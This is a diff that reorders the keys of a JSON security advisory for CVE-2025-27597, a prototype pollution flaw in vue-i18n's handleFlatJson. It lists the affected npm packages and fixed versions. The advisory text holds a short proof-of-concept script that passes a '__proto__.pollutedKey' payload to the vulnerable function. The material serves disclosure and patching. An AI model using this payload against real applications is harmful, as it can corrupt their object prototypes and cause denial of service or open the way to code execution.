@@ -1,24 +1,276 @@
 {
-  "id": "GHSA-p2ph-7g93-hw3m",
-  "summary": "Vue I18n Allows Prototype Pollution in `handleFlatJson`",
-  "details": "**Vulnerability type:**\nPrototype Pollution\n\n**Vulnerability Location(s):**\n```js\n# v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n```\n\n**Description:**\n\nThe latest version of `@intlify/message-resolver (9.1)` and `@intlify/vue-i18n-core (9.2 or later)`, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) `handleFlatJson`. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.\n\nMoreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.\n\n\n**PoC:**\n\n```bash\n// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n```\n\n```js\n// poc.js\n(async () => {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n```",
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "@intlify/message-resolver",
+        "purl": "pkg:npm/%40intlify/message-resolver"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "9.1.0"
+            },
+            {
+              "fixed": "9.1.11"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "@intlify/vue-i18n-core",
+        "purl": "pkg:npm/%40intlify/vue-i18n-core"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "9.2.0"
+            },
+            {
+              "fixed": "9.14.3"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "petite-vue-i18n",
+        "purl": "pkg:npm/petite-vue-i18n"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "10.0.0"
+            },
+            {
+              "fixed": "10.0.6"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "vue-i18n",
+        "purl": "pkg:npm/vue-i18n"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "9.1.0"
+            },
+            {
+              "fixed": "9.14.3"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "@intlify/core-base",
+        "purl": "pkg:npm/%40intlify/core-base"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "9.1.0"
+            },
+            {
+              "fixed": "9.1.11"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "@intlify/core",
+        "purl": "pkg:npm/%40intlify/core"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "9.1.0"
+            },
+            {
+              "fixed": "9.1.11"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "last_known_affected_version_range": "< 10.0.6",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "@intlify/vue-i18n-core",
+        "purl": "pkg:npm/%40intlify/vue-i18n-core"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "10.0.0-alpha.1"
+            },
+            {
+              "fixed": "11.1.2"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "@intlify/vue-i18n-core",
+        "purl": "pkg:npm/%40intlify/vue-i18n-core"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "11.0.0-beta.0"
+            },
+            {
+              "fixed": "11.1.2"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "petite-vue-i18n",
+        "purl": "pkg:npm/petite-vue-i18n"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "11.0.0-beta.0"
+            },
+            {
+              "fixed": "11.1.2"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "vue-i18n",
+        "purl": "pkg:npm/vue-i18n"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "10.0.0-alpha.1"
+            },
+            {
+              "fixed": "10.0.6"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "vue-i18n",
+        "purl": "pkg:npm/vue-i18n"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "11.0.0-beta.0"
+            },
+            {
+              "fixed": "11.1.2"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
   "aliases": [
     "CVE-2025-27597"
   ],
-  "modified": "2025-03-07T19:16:45Z",
-  "published": "2025-03-07T15:58:24Z",
-  "related": [
-    "CVE-2025-27597"
-  ],
   "database_specific": {
-    "nvd_published_at": "2025-03-07T16:15:39Z",
     "cwe_ids": [
       "CWE-1321"
     ],
-    "severity": "HIGH",
     "github_reviewed": true,
-    "github_reviewed_at": "2025-03-07T15:58:24Z"
+    "github_reviewed_at": "2025-03-07T15:58:24Z",
+    "nvd_published_at": "2025-03-07T16:15:39Z",
+    "severity": "HIGH"
   },
+  "details": "**Vulnerability type:**\nPrototype Pollution\n\n**Vulnerability Location(s):**\n```js\n# v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n```\n\n**Description:**\n\nThe latest version of `@intlify/message-resolver (9.1)` and `@intlify/vue-i18n-core (9.2 or later)`, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) `handleFlatJson`. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.\n\nMoreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.\n\n\n**PoC:**\n\n```bash\n// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n```\n\n```js\n// poc.js\n(async () => {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n```",
+  "id": "GHSA-p2ph-7g93-hw3m",
+  "modified": "2025-03-07T19:16:45Z",
+  "published": "2025-03-07T15:58:24Z",
   "references": [
     {
       "type": "WEB",
@@ -61,267 +313,15 @@
       "url": "https://github.com/intlify/vue-i18n/releases/tag/v9.14.3"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "@intlify/message-resolver",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/%40intlify/message-resolver"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "9.1.0"
-            },
-            {
-              "fixed": "9.1.11"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
-      }
-    },
-    {
-      "package": {
-        "name": "@intlify/vue-i18n-core",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/%40intlify/vue-i18n-core"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "9.2.0"
-            },
-            {
-              "fixed": "9.14.3"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
-      }
-    },
-    {
-      "package": {
-        "name": "petite-vue-i18n",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/petite-vue-i18n"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "10.0.0"
-            },
-            {
-              "fixed": "10.0.6"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
-      }
-    },
-    {
-      "package": {
-        "name": "vue-i18n",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/vue-i18n"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "9.1.0"
-            },
-            {
-              "fixed": "9.14.3"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
-      }
-    },
-    {
-      "package": {
-        "name": "@intlify/core-base",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/%40intlify/core-base"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "9.1.0"
-            },
-            {
-              "fixed": "9.1.11"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
-      }
-    },
-    {
-      "package": {
-        "name": "@intlify/core",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/%40intlify/core"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "9.1.0"
-            },
-            {
-              "fixed": "9.1.11"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
-      }
-    },
-    {
-      "package": {
-        "name": "@intlify/vue-i18n-core",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/%40intlify/vue-i18n-core"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "10.0.0-alpha.1"
-            },
-            {
-              "fixed": "11.1.2"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "last_known_affected_version_range": "< 10.0.6",
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
-      }
-    },
-    {
-      "package": {
-        "name": "@intlify/vue-i18n-core",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/%40intlify/vue-i18n-core"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "11.0.0-beta.0"
-            },
-            {
-              "fixed": "11.1.2"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
-      }
-    },
-    {
-      "package": {
-        "name": "petite-vue-i18n",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/petite-vue-i18n"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "11.0.0-beta.0"
-            },
-            {
-              "fixed": "11.1.2"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
-      }
-    },
-    {
-      "package": {
-        "name": "vue-i18n",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/vue-i18n"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "10.0.0-alpha.1"
-            },
-            {
-              "fixed": "10.0.6"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
-      }
-    },
-    {
-      "package": {
-        "name": "vue-i18n",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/vue-i18n"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "11.0.0-beta.0"
-            },
-            {
-              "fixed": "11.1.2"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-p2ph-7g93-hw3m/GHSA-p2ph-7g93-hw3m.json"
-      }
-    }
+  "related": [
+    "CVE-2025-27597"
   ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V4",
-      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P",
+      "type": "CVSS_V4"
     }
-  ]
+  ],
+  "summary": "Vue I18n Allows Prototype Pollution in `handleFlatJson`"
 }
